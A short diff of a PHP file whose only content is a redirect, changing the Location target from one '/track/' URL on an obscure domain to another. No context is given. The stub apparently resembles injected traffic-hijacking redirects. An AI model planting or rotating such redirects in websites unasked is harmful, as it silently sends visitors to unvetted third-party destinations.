@@ -1,4 +1,4 @@
 <?php
-header("Location: https://daqe.us/track/");
+header("Location: https://pacbk.site/track/");
 die();
 ?>
